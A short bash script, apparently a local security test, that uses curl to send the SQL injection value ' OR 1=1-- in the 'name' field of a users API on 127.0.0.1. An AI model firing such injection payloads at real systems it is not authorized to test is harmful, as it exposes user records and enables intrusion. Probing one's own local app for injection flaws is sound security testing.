#!/usr/bin/env bash
set -euo pipefail
curl --get --data-urlencode "name=' OR 1=1--" http://127.0.0.1:5000/api/users
